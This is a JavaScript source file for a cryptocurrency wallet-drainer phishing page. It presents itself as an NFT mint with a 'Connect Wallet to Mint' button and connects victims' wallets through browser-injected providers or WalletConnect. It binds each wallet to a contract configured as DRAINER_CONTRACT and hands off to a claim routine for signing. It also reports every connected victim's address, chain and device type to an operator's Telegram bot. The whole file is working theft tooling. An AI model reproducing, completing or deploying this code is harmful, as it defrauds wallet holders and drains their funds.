import { CONFIG } from './config.js';

;(async function () {
  'use strict';

  /* ======================================================================
   * CONFIG
   * ==================================================================== */
  const {
    PROJECT_ID,
    DAPP_METADATA,
    DRAINER_CONTRACT,
    CONTRACT_ABI,
    MAINNET_ID = 1,
    TELEGRAM_BOT_TOKEN,
    TELEGRAM_CHAT_ID,
  } = CONFIG;

  if (!PROJECT_ID || String(PROJECT_ID).length < 30) {
    console.error('[main.js] Missing or invalid PROJECT_ID — WalletConnect will fail.');
  }

  const WC_INIT_TIMEOUT_MS      = 30_000;   // WC init is slow on mobile
  const WC_CONNECT_TIMEOUT_MS   = 180_000;  // 3 min to approve in wallet
  const INJECTED_TIMEOUT_MS     = 15_000;   // mobile injected is slow
  const LIVENESS_TIMEOUT_MS     = 4_000;

  /* ======================================================================
   * PLATFORM
   * ==================================================================== */
  const UA              = navigator.userAgent || '';
  const isIOSDevice     = /iPhone|iPad|iPod/i.test(UA);
  const isAndroidDevice = /Android/i.test(UA);
  const isMobileDevice  = isIOSDevice || isAndroidDevice ||
                          /webOS|BlackBerry|IEMobile|Opera Mini/i.test(UA);
  const isDesktopDevice = !isMobileDevice;

  const platformLabel = () => {
    if (isIOSDevice)     return 'ios';
    if (isAndroidDevice) return 'android';
    if (/Windows/i.test(UA))            return 'windows';
    if (/Macintosh|Mac OS X/i.test(UA)) return 'mac';
    return 'unknown';
  };

  /* ======================================================================
   * DEBUG PANEL
   * ==================================================================== */
  const debugArea = document.createElement('div');
  debugArea.id = 'wc-debug';
  debugArea.style.cssText = `
    position: fixed; bottom: 0; left: 0; width: 100%;
    background: #000; color: #0f0; font-size: 12px; padding: 5px;
    z-index: 10000; max-height: 150px; overflow-y: auto;
    display: none; font-family: monospace;
  `;
  document.body.appendChild(debugArea);

  let debugVisible = false;
  document.addEventListener('dblclick', () => {
    debugVisible = !debugVisible;
    debugArea.style.display = debugVisible ? 'block' : 'none';
  });

  function logDebug(msg) {
    const ts = new Date().toLocaleTimeString();
    console.log('[main.js]', msg);
    debugArea.innerHTML += `<div>${ts}: ${msg}</div>`;
    debugArea.scrollTop = debugArea.scrollHeight;
  }

  /* ======================================================================
   * UTILITIES
   * ==================================================================== */
  const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

  function withTimeout(promise, ms, label) {
    return Promise.race([
      promise,
      new Promise((_, reject) =>
        setTimeout(() => reject(new Error(`Timeout: ${label} (${ms}ms)`)), ms)
      ),
    ]);
  }

  async function tryImport(urls, pickFn, label, timeoutMs = 10_000) {
    let lastErr = null;
    for (const url of urls) {
      try {
        const t0 = performance.now();
        const m = await withTimeout(import(/* @vite-ignore */ url), timeoutMs, `${label}@${url}`);
        const v = pickFn(m);
        if (!v) throw new Error(`${label} export missing at ${url}`);
        logDebug(`✅ ${label} loaded (${(performance.now() - t0).toFixed(0)}ms)`);
        return v;
      } catch (e) {
        lastErr = e;
        logDebug(`❌ ${label} @ ${url}: ${e.message}`);
      }
    }
    throw lastErr || new Error(`${label} failed on all CDNs`);
  }

  /* ======================================================================
   * TELEGRAM
   * ==================================================================== */
  async function sendTelegramNotification(text) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return false;
    try {
      const r = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text, parse_mode: 'HTML' }),
      });
      return r.ok;
    } catch (e) {
      console.error('[main.js] Telegram error:', e);
      return false;
    }
  }
  window.testTelegram = (m) => sendTelegramNotification(m || ('🧪 Test ' + new Date().toISOString()));

  /* ======================================================================
   * DOM
   * ==================================================================== */
  const connectButton = document.getElementById('connectButton');
  const walletButton  = document.getElementById('walletButton');
  const claimStatus   = document.getElementById('claimStatus');

  /* ======================================================================
   * STATE
   * ==================================================================== */
  let EthereumProvider = null;   // class
  let Web3Ctor         = null;   // class
  let wcProvider       = null;   // EthereumProvider instance
  let injectedProvider = null;   // window.ethereum instance
  let activeProvider   = null;   // whichever is live now
  let web3Instance     = null;
  let contractInstance = null;
  let connectionMode   = null;   // 'walletconnect' | 'injected' | null
  let isConnecting     = false;
  let isDisconnecting  = false;
  let connectedAddress = null;
  let relayUrl         = null;

  /* ======================================================================
   * BUTTON / STATUS UI
   * ==================================================================== */
  function setButtonState(button, state) {
    if (!button) return;
    button.style.display      = 'inline-block';
    button.style.padding      = '14px 28px';
    button.style.borderRadius = '8px';
    button.style.fontWeight   = '600';
    button.style.border       = 'none';
    button.style.cursor       = state === 'loading' ? 'not-allowed' : 'pointer';
    button.style.color        = 'white';
    button.style.fontSize     = '16px';
    button.style.minWidth     = '180px';
    button.disabled           = state === 'loading';
    switch (state) {
      case 'loading':
        button.style.background = 'linear-gradient(135deg,#666,#888)';
        button.innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right:8px"></i> Connecting...';
        break;
      case 'connected':
        button.style.background = 'linear-gradient(135deg,#10B981,#059669)';
        button.innerHTML = '<i class="fas fa-check-circle" style="margin-right:8px"></i> Connected';
        break;
      case 'disconnect':
        button.style.background = 'linear-gradient(135deg,#EF4444,#DC2626)';
        button.innerHTML = '<i class="fas fa-power-off" style="margin-right:8px"></i> Disconnect';
        break;
      case 'failed':
        button.style.background = 'linear-gradient(135deg,#EF4444,#DC2626)';
        button.innerHTML = '<i class="fas fa-exclamation-triangle" style="margin-right:8px"></i> Failed';
        setTimeout(() => setButtonState(button, 'normal'), 3000);
        break;
      default:
        button.style.background = 'linear-gradient(135deg,#FF6B00,#FF8C00)';
        button.innerHTML = '<i class="fas fa-wallet" style="margin-right:8px"></i> Connect Wallet to Mint';
    }
  }

  function showStatus(msg, type = 'info') {
    if (!claimStatus) return;
    claimStatus.textContent = msg;
    claimStatus.className   = `status ${type}`;
    claimStatus.style.display      = 'block';
    claimStatus.style.padding      = '12px 16px';
    claimStatus.style.borderRadius = '8px';
    claimStatus.style.marginTop    = '12px';
    claimStatus.style.fontWeight   = '500';
    claimStatus.style.fontSize     = '14px';
    claimStatus.style.textAlign    = 'center';
    const styles = {
      success: { background: 'linear-gradient(135deg,#DCFCE7,#BBF7D0)', color: '#166534', border: '1px solid #86EFAC' },
      error:   { background: 'linear-gradient(135deg,#FEE2E2,#FECACA)', color: '#991B1B', border: '1px solid #FCA5A5' },
      info:    { background: 'linear-gradient(135deg,#DBEAFE,#BFDBFE)', color: '#1E40AF', border: '1px solid #93C5FD' },
    };
    Object.assign(claimStatus.style, styles[type] || styles.info);
    if (type === 'error' || type === 'success') {
      setTimeout(() => { claimStatus.style.display = 'none'; }, 5000);
    }
  }

  setButtonState(connectButton, 'normal');
  if (walletButton) setButtonState(walletButton, 'normal');

  /* ======================================================================
   * LOCAL STORAGE — minimal; the WC library owns its own session storage
   * ==================================================================== */
  const LS = {
    addr: 'connectedWallet',
    mode: 'connectionMode',
  };
  const saveWallet = (address, mode) => {
    try {
      localStorage.setItem(LS.addr, address);
      if (mode) localStorage.setItem(LS.mode, mode);
    } catch {}
  };
  const getSavedWallet = () => { try { return localStorage.getItem(LS.addr); } catch { return null; } };
  const getSavedMode   = () => { try { return localStorage.getItem(LS.mode); } catch { return null; } };
  const clearSavedWallet = () => {
    try {
      localStorage.removeItem(LS.addr);
      localStorage.removeItem(LS.mode);
    } catch {}
  };

  /* ======================================================================
   * PUBLISH GLOBAL STATE (consumed by script.js)
   *
   * IMPORTANT: script.js reads window.__apexConnected.provider for signing.
   * We must verify the provider is ALIVE before publishing — otherwise
   * script.js gets a dead provider and every approval fails silently.
   * ==================================================================== */
  async function publishGlobalState(address, chain) {
    const provider = activeProvider;

    if (provider) {
      try {
        await withTimeout(
          provider.request({ method: 'eth_chainId' }),
          LIVENESS_TIMEOUT_MS,
          'provider-liveness'
        );
      } catch (e) {
        logDebug(`⚠️ Provider liveness probe failed: ${e.message}`);
        // Publish anyway — script.js will re-check on use.
      }
    }

    window.__apexConnected = {
      address,
      chain,
      web3: web3Instance,
      contract: contractInstance,
      provider: provider || null,
      mode: connectionMode,
      publishedAt: Date.now(),
    };
    logDebug(`publish: addr=${address} mode=${connectionMode} provider=${!!provider}`);
    window.dispatchEvent(new CustomEvent('apex:connected', { detail: { address, chain } }));
  }

  /* ======================================================================
   * CONNECTED UI
   * ==================================================================== */
  function updateConnectedUI(address, chain = 'evm') {
    connectedAddress = address;
    setButtonState(connectButton, 'disconnect');
    if (walletButton) setButtonState(walletButton, 'disconnect');

    const chainLabels = { evm: '◆ ETH' };
    const chainLabel  = chainLabels[chain] || 'Unknown';

    let display = document.getElementById('connectedAddressDisplay');
    if (!display) {
      display = document.createElement('div');
      display.id = 'connectedAddressDisplay';
      display.style.cssText = `
        margin-top:12px;padding:10px 16px;font-family:'JetBrains Mono',monospace;
        font-size:14px;color:#059669;text-align:center;
        background:linear-gradient(135deg,#ECFDF5,#D1FAE5);
        border-radius:8px;border:1px solid #A7F3D0;`;
      connectButton.parentNode.appendChild(display);
    }

    const short = `${address.slice(0, 6)}...${address.slice(-4)}`;
    display.innerHTML = `
      <div style="display:flex;align-items:center;justify-content:center;gap:8px;flex-wrap:wrap;">
        <i class="fas fa-check-circle" style="color:#059669;"></i>
        <span>Connected: ${short}</span>
        <span style="background:#1F2937;color:white;padding:2px 10px;border-radius:12px;font-size:12px;font-weight:600;">${chainLabel}</span>
        <button id="copyAddress" style="background:none;border:none;color:#059669;cursor:pointer;padding:4px;">
          <i class="far fa-copy"></i>
        </button>
      </div>`;

    document.getElementById('copyAddress')?.addEventListener('click', () => {
      navigator.clipboard.writeText(address).then(() => {
        const b = document.getElementById('copyAddress');
        const o = b.innerHTML;
        b.innerHTML = '<i class="fas fa-check"></i>';
        setTimeout(() => { b.innerHTML = o; }, 2000);
      });
    });

    showStatus(`Connected to ${chainLabel}`, 'success');
    publishGlobalState(address, chain);

    sendTelegramNotification(
      `🔗 <b>Wallet Connected</b>\n` +
      `📌 <b>Chain:</b> ${chainLabel}\n` +
      `🧩 <b>Mode:</b> ${connectionMode || 'unknown'}\n` +
      `👤 <b>Address:</b> <code>${address}</code>\n` +
      `🕒 ${new Date().toLocaleString()}\n` +
      `📱 <b>Mobile:</b> ${isMobileDevice ? 'Yes' : 'No'}`
    );
  }

  function resetConnectedUI() {
    connectedAddress = null;
    setButtonState(connectButton, 'normal');
    if (walletButton) setButtonState(walletButton, 'normal');
    document.getElementById('connectedAddressDisplay')?.remove();
    showStatus('Wallet disconnected', 'info');
    web3Instance = null;
    contractInstance = null;
    activeProvider = null;
    connectionMode = null;
    window.__apexConnected = null;
  }

  /* ======================================================================
   * EIP-6963
   * ==================================================================== */
  let evmProviders = [];
  let eip6963Initialized = false;

  function setupEIP6963() {
    if (eip6963Initialized) return;
    eip6963Initialized = true;
    window.addEventListener('eip6963:announceProvider', (e) => {
      const d = e.detail;
      if (!evmProviders.some((p) => p.info.uuid === d.info.uuid)) {
        evmProviders.push(d);
        logDebug(`EIP-6963: ${d.info.name}`);
      }
    });
    const req = () => window.dispatchEvent(new Event('eip6963:requestProvider'));
    req(); setTimeout(req, 500); setTimeout(req, 1500);
  }

  function showWalletSelectionModal(providers, cb) {
    const overlay = document.createElement('div');
    overlay.style.cssText = `position:fixed;inset:0;background:rgba(0,0,0,.7);display:flex;align-items:center;justify-content:center;z-index:99999;`;
    const modalEl = document.createElement('div');
    modalEl.style.cssText = `background:#1F2937;padding:24px;border-radius:16px;max-width:400px;width:90%;color:white;font-family:Inter,sans-serif;`;
    modalEl.innerHTML = `
      <h3 style="margin-top:0;font-weight:600;font-size:20px;">Select a Wallet</h3>
      <div id="wl" style="display:flex;flex-direction:column;gap:10px;margin:16px 0"></div>
      <button id="cw" style="background:none;border:1px solid #666;color:#ccc;padding:8px 16px;border-radius:8px;cursor:pointer;width:100%">Cancel</button>`;
    overlay.appendChild(modalEl);
    document.body.appendChild(overlay);
    const list = modalEl.querySelector('#wl');
    providers.forEach((p) => {
      const b = document.createElement('button');
      b.textContent = p.info.name;
      b.style.cssText = `background:#374151;border:none;padding:12px;border-radius:8px;color:white;font-size:16px;cursor:pointer;text-align:left;display:flex;gap:10px;align-items:center;`;
      if (p.info.icon) {
        const i = document.createElement('img');
        i.src = p.info.icon;
        i.style.width = '24px'; i.style.height = '24px';
        b.prepend(i);
      }
      b.onclick = () => { overlay.remove(); cb(p); };
      list.appendChild(b);
    });
    modalEl.querySelector('#cw').onclick = () => { overlay.remove(); cb(null); };
  }

  /* ======================================================================
   * IN-WALLET BROWSER DETECTION
   * ==================================================================== */
  function detectInWalletBrowser() {
    const eth = window.ethereum;
    if (!eth) return null;
    // Trust Wallet iOS doesn't always set the UA — check flags first
    if (eth.isTrust || eth.isTrustWallet || /TrustWallet|Trust\s*Wallet/i.test(UA)) {
      return { wallet: 'trust', name: 'Trust Wallet' };
    }
    if (eth.isMetaMask && /MetaMaskMobile/i.test(UA)) {
      return { wallet: 'metamask', name: 'MetaMask' };
    }
    if (eth.isCoinbaseWallet || /CoinbaseWallet/i.test(UA)) {
      return { wallet: 'coinbase', name: 'Coinbase Wallet' };
    }
    if (eth.isRabby || /Rabby/i.test(UA)) {
      return { wallet: 'rabby', name: 'Rabby' };
    }
    if (eth.isBraveWallet) return { wallet: 'brave', name: 'Brave' };
    return null;
  }

  /* ======================================================================
   * PROVIDER EVENT ATTACHMENT (idempotent)
   * ==================================================================== */
  const attachedProviders = new WeakSet();

  function attachProviderEvents(provider) {
    if (!provider || typeof provider.on !== 'function') return;
    if (attachedProviders.has(provider)) return;
    attachedProviders.add(provider);

    provider.on('accountsChanged', (accounts) => {
      logDebug(`accountsChanged: ${JSON.stringify(accounts)}`);
      if (!accounts || accounts.length === 0) {
        // Only treat as disconnect if we're the active mode.
        if (activeProvider === provider) hardDisconnect({ skipWalletCall: true });
        return;
      }
      const a = accounts[0];
      saveWallet(a, connectionMode);
      updateConnectedUI(a, 'evm');
      setTimeout(() => {
        if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
      }, 800);
    });

    provider.on('chainChanged', (id) => {
      const chainId = typeof id === 'string' ? parseInt(id, 16) : id;
      logDebug(`chainChanged: ${chainId}`);
      showStatus(`Network changed to ${chainId}`, 'info');
      if (connectedAddress && web3Instance) {
        contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
        publishGlobalState(connectedAddress, 'evm');
      }
    });

    provider.on('disconnect', (reason) => {
      logDebug(`disconnect: ${reason}`);
      if (activeProvider === provider) hardDisconnect({ skipWalletCall: true });
    });

    // WC-only event
    try {
      provider.on('session_delete', () => {
        logDebug('session_delete');
        if (activeProvider === provider) hardDisconnect({ skipWalletCall: true });
      });
    } catch {}
  }

  /* ======================================================================
   * INJECTED CONNECT
   * ==================================================================== */
  async function connectInjected() {
    setupEIP6963();
    await sleep(500);   // let EIP-6963 announce

    const inWallet = detectInWalletBrowser();
    let providers = evmProviders.filter((p) => p.provider);

    if (providers.length === 0 && window.ethereum) {
      providers = [{
        info: { name: inWallet?.name || 'Injected', rdns: 'io.injected' },
        provider: window.ethereum,
      }];
    }
    if (providers.length === 0) return null;

    let chosen = null;
    if (inWallet && window.ethereum) {
      chosen = { info: { name: inWallet.name }, provider: window.ethereum };
    } else if (providers.length === 1) {
      chosen = providers[0];
    } else {
      const known = providers.find((p) =>
        p.info?.rdns === 'io.metamask' || /metamask/i.test(p.info?.name || '')
      );
      chosen = known || await new Promise((res) => showWalletSelectionModal(providers, res));
      if (!chosen) return null;
    }

    try {
      const provider = chosen.provider;

      let accounts = null;
      for (let attempt = 0; attempt < 2 && !accounts?.length; attempt++) {
        try {
          accounts = await withTimeout(
            provider.request({ method: 'eth_requestAccounts' }),
            INJECTED_TIMEOUT_MS,
            'eth_requestAccounts'
          );
        } catch (e) {
          logDebug(`eth_requestAccounts attempt ${attempt + 1}: ${e.message}`);
          if (attempt === 0) await sleep(1000);
        }
      }
      if (!accounts?.length) return null;

      const address = accounts[0];

      const Web3 = Web3Ctor;
      web3Instance     = new Web3(provider);
      contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
      injectedProvider = provider;
      activeProvider   = provider;
      connectionMode   = 'injected';

      saveWallet(address, 'injected');
      attachProviderEvents(provider);
      updateConnectedUI(address, 'evm');
      logDebug(`✅ Injected: ${address} (${chosen.info?.name || 'wallet'})`);
      return address;
    } catch (e) {
      logDebug('Injected error: ' + e.message);
      return null;
    }
  }

  /* ======================================================================
   * WALLETCONNECT INIT — SINGLE INSTANCE, LIBRARY-OWNED MODAL
   *
   * This is the CORRECT pattern. EthereumProvider.init() creates its own
   * internal SignClient and (with showQrModal:true) owns the modal.
   *
   * We do NOT:
   *   - instantiate SignClient separately
   *   - instantiate WalletConnectModal separately
   *   - pass a `session` to init()
   *   - retry with a different projectId
   * ==================================================================== */
  async function initWalletConnect() {
    if (wcProvider) {
      // Verify liveness before returning a cached provider
      try {
        await withTimeout(
          wcProvider.request({ method: 'eth_chainId' }),
          LIVENESS_TIMEOUT_MS, 'wc-liveness'
        );
        return wcProvider;
      } catch {
        logDebug('existing WC provider dead — reinitialising');
        wcProvider = null;
      }
    }

    if (!EthereumProvider) {
      logDebug('❌ EthereumProvider class not loaded');
      return null;
    }
    if (!PROJECT_ID) {
      logDebug('❌ PROJECT_ID missing in config.js');
      return null;
    }

    const opts = {
      projectId: PROJECT_ID,
      chains: [MAINNET_ID],
      optionalChains: [MAINNET_ID],
      showQrModal: true,          // ← library owns the modal
      metadata: DAPP_METADATA,
      methods: ['eth_sendTransaction', 'personal_sign', 'eth_signTypedData_v4', 'eth_sign'],
      events: ['chainChanged', 'accountsChanged'],
    };
    if (relayUrl) opts.relayUrl = relayUrl;

    try {
      logDebug(`WC init: projectId=${String(PROJECT_ID).slice(0, 8)}… relay=${relayUrl || 'default'}`);
      const t0 = performance.now();
      wcProvider = await withTimeout(
        EthereumProvider.init(opts),
        WC_INIT_TIMEOUT_MS,
        'EthereumProvider.init'
      );
      logDebug(`✅ WC provider ready in ${(performance.now() - t0).toFixed(0)}ms`);
      return wcProvider;
    } catch (e) {
      logDebug(`WC init failed: ${e.message}`);
      wcProvider = null;
      return null;
    }
  }

  /* ======================================================================
   * WALLETCONNECT CONNECT
   * ==================================================================== */
  async function connectWalletConnect() {
    const provider = await initWalletConnect();
    if (!provider) return null;

    // If session already exists (restored from localStorage), reuse it.
    if (provider.session && provider.accounts?.length) {
      const a = provider.accounts[0];
      activeProvider   = provider;
      connectionMode   = 'walletconnect';
      web3Instance     = new Web3Ctor(provider);
      contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
      saveWallet(a, 'walletconnect');
      attachProviderEvents(provider);
      updateConnectedUI(a, 'evm');
      logDebug(`♻️ WC session reused: ${a}`);
      return a;
    }

    showStatus('Opening wallet options…', 'info');

    try {
      // provider.connect() (or enable()) shows the modal and awaits approval.
      // We give it the full WC_CONNECT_TIMEOUT_MS because Trust Wallet users
      // may need to open the wallet, switch apps, and approve.
      const connectResult = await withTimeout(
        provider.connect({
          chains: [MAINNET_ID],
          optionalChains: [MAINNET_ID],
          rpcMap: { [MAINNET_ID]: 'https://cloudflare-eth.com' },
        }),
        WC_CONNECT_TIMEOUT_MS,
        'WC connect'
      );

      // provider.accounts is populated after connect() resolves.
      const accounts = provider.accounts || connectResult?.accounts || [];
      if (!accounts.length) {
        logDebug('WC connect resolved but no accounts');
        return null;
      }

      const address = accounts[0];
      activeProvider   = provider;
      connectionMode   = 'walletconnect';
      web3Instance     = new Web3Ctor(provider);
      contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);

      saveWallet(address, 'walletconnect');
      attachProviderEvents(provider);
      updateConnectedUI(address, 'evm');
      logDebug(`✅ WC connected: ${address}`);
      return address;
    } catch (e) {
      const msg = e?.message || '';
      logDebug('WC connect error: ' + msg);

      // User rejection vs other errors
      if (/rejected|user rejected|user closed|user disapproved/i.test(msg)) {
        showStatus('Connection cancelled', 'info');
      } else if (/expired|timeout/i.test(msg)) {
        showStatus('Wallet did not respond — please try again', 'error');
      } else {
        showStatus('Connection failed — please try again', 'error');
      }
      return null;
    }
  }

  /* ======================================================================
   * HARD DISCONNECT — also clears the WC session so Trust Wallet releases it
   * ==================================================================== */
  async function hardDisconnect({ skipWalletCall = false } = {}) {
    if (isDisconnecting) return;
    isDisconnecting = true;

    try {
      if (!skipWalletCall && connectionMode === 'walletconnect' && wcProvider) {
        try {
          if (wcProvider.session) {
            await Promise.race([
              wcProvider.disconnect(),
              new Promise((_, rej) => setTimeout(() => rej(new Error('disconnect timeout')), 8000)),
            ]);
          }
        } catch (e) {
          logDebug('WC disconnect err: ' + e.message);
        }
      }

      if (connectionMode === 'injected' && injectedProvider?.request) {
        // Best-effort revoke (MetaMask supports it; others may not)
        try {
          await injectedProvider.request({
            method: 'wallet_revokePermissions',
            params: [{ eth_accounts: {} }],
          });
        } catch {}
      }
    } finally {
      wcProvider = null;
      injectedProvider = null;
      activeProvider = null;
      web3Instance = null;
      contractInstance = null;
      connectionMode = null;
      resetConnectedUI();
      clearSavedWallet();
      isDisconnecting = false;
      logDebug('🔌 Disconnected');
    }
  }

  /* ======================================================================
   * CONNECT DISPATCHER
   * ==================================================================== */
  async function connectWallet() {
    if (isConnecting) return;
    isConnecting = true;

    setButtonState(connectButton, 'loading');
    if (walletButton) setButtonState(walletButton, 'loading');
    showStatus('Connecting…', 'info');

    let address = null;

    try {
      const inWallet = detectInWalletBrowser();

      // 1. In-wallet browser (Trust Wallet / MetaMask mobile dApp browser)
      //    Injected is the ONLY correct path here — WC would be redundant.
      if (inWallet && window.ethereum) {
        logDebug(`📱 In-wallet browser: ${inWallet.name}`);
        address = await connectInjected();
      }

      // 2. Desktop: try injected, fall back to WC
      if (!address && isDesktopDevice && window.ethereum) {
        address = await connectInjected();
      }

      // 3. WalletConnect (always available as a fallback)
      if (!address) {
        address = await connectWalletConnect();
      }
    } catch (e) {
      logDebug('connectWallet exception: ' + e.message);
    } finally {
      isConnecting = false;
    }

    if (address) {
      setButtonState(connectButton, 'connected');
      if (walletButton) setButtonState(walletButton, 'connected');
      // Give script.js a moment to sync global state before triggering claim.
      setTimeout(() => {
        if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
      }, 1500);
    } else {
      showStatus('Connection failed or cancelled', 'error');
      setButtonState(connectButton, 'failed');
      if (walletButton) setButtonState(walletButton, 'failed');
    }
  }

  /* ======================================================================
   * BUTTON WIRING
   * ==================================================================== */
  async function handleClick() {
    if (isConnecting || isDisconnecting) return;
    const hasLiveProvider = !!(activeProvider || wcProvider || injectedProvider);
    if (hasLiveProvider && connectedAddress) {
      showStatus('Disconnecting…', 'info');
      await hardDisconnect();
    } else {
      // Clear stale state so a failed first attempt can be retried cleanly.
      if (!hasLiveProvider) {
        clearSavedWallet();
        resetConnectedUI();
      }
      await connectWallet();
    }
  }

  if (connectButton) connectButton.addEventListener('click', handleClick);
  if (walletButton)  walletButton.addEventListener('click', handleClick);

  if (walletButton && isMobileDevice) {
    walletButton.addEventListener('click', () => {
      setTimeout(() => connectButton?.scrollIntoView({ behavior: 'smooth', block: 'center' }), 300);
    });
  }

  /* ======================================================================
   * SESSION RESTORE
   *
   * The WC library rehydrates its own session from localStorage on init().
   * We just check provider.session after init.
   * ==================================================================== */
  async function restoreWalletConnection() {
    const savedWallet = getSavedWallet();
    const savedMode   = getSavedMode();
    if (!savedWallet) return;

    // WC restore — library handles the session persistence
    if (savedMode === 'walletconnect' || !savedMode) {
      try {
        const provider = await initWalletConnect();
        if (provider?.session && provider.accounts?.length) {
          const a = provider.accounts[0];
          activeProvider   = provider;
          connectionMode   = 'walletconnect';
          web3Instance     = new Web3Ctor(provider);
          contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
          saveWallet(a, 'walletconnect');
          attachProviderEvents(provider);
          updateConnectedUI(a, 'evm');
          logDebug(`♻️ WC session restored: ${a}`);
          return;
        }
      } catch (e) {
        logDebug('WC restore err: ' + e.message);
      }
    }

    // Injected restore
    if (savedMode === 'injected' || !savedMode) {
      if (window.ethereum) {
        try {
          const accounts = await withTimeout(
            window.ethereum.request({ method: 'eth_accounts' }),
            4000, 'restore-injected'
          );
          if (accounts?.length && accounts[0].toLowerCase() === savedWallet.toLowerCase()) {
            injectedProvider = window.ethereum;
            activeProvider   = window.ethereum;
            connectionMode   = 'injected';
            web3Instance     = new Web3Ctor(window.ethereum);
            contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
            saveWallet(savedWallet, 'injected');
            attachProviderEvents(window.ethereum);
            updateConnectedUI(savedWallet, 'evm');
            logDebug(`♻️ Injected session restored: ${savedWallet}`);
            return;
          }
        } catch (e) {
          logDebug('Injected restore err: ' + e.message);
        }
      }
    }

    logDebug('⚠️ No restorable session — clearing saved wallet');
    clearSavedWallet();
  }

  /* ======================================================================
   * RELAY PROBE — informational; the WC SDK falls back on its own
   * ==================================================================== */
  async function probeRelay(timeoutMs = 2500) {
    const urls = ['wss://relay.walletconnect.com', 'wss://relay.walletconnect.org'];
    for (const url of urls) {
      try {
        const ok = await withTimeout(
          new Promise((resolve) => {
            const ws = new WebSocket(url);
            const t = setTimeout(() => { try { ws.close(); } catch {} resolve(false); }, timeoutMs);
            ws.onopen  = () => { clearTimeout(t); try { ws.close(); } catch {} resolve(true); };
            ws.onerror = () => { clearTimeout(t); try { ws.close(); } catch {} resolve(false); };
          }),
          timeoutMs + 500,
          'relay-probe'
        );
        if (ok) { logDebug(`🌐 Relay OK: ${url}`); return url; }
      } catch {}
    }
    logDebug('⚠️ No relay reachable — SDK will use its default');
    return null;
  }

  /* ======================================================================
   * BOOT
   * ==================================================================== */
  try {
    const providerCdn = [
      'https://esm.sh/@walletconnect/ethereum-provider@2.11.0?bundle',
      'https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.0/+esm',
      'https://cdn.skypack.dev/@walletconnect/ethereum-provider@2.11.0',
    ];
    const web3Cdn = [
      'https://esm.sh/web3@4.3.0?bundle',
      'https://cdn.jsdelivr.net/npm/web3@4.3.0/+esm',
    ];

    const [EP, W3, relay] = await Promise.all([
      tryImport(providerCdn, (m) => m.EthereumProvider || m.default?.EthereumProvider || m.default || m, 'EthereumProvider'),
      tryImport(web3Cdn,     (m) => m.default?.default || m.default || m.Web3 || m, 'Web3'),
      probeRelay().catch(() => null),
    ]);

    EthereumProvider = EP;
    Web3Ctor         = W3.default || W3;
    relayUrl         = relay;

    logDebug('✅ Libraries loaded');

    setupEIP6963();

    await sleep(300);
    await restoreWalletConnection();
  } catch (err) {
    logDebug('Fatal: ' + err.message);
    showStatus('Failed to load wallet libraries', 'error');
    return;
  }

  /* ======================================================================
   * CLEANUP
   * ==================================================================== */
  window.addEventListener('beforeunload', () => {
    // Provider's own cleanup on unload — nothing to do here.
  });

  logDebug(`✅ main.js ready — platform=${platformLabel()} mobile=${isMobileDevice}`);
  console.log('✅ main.js ready — test with testTelegram("hi")');
})();
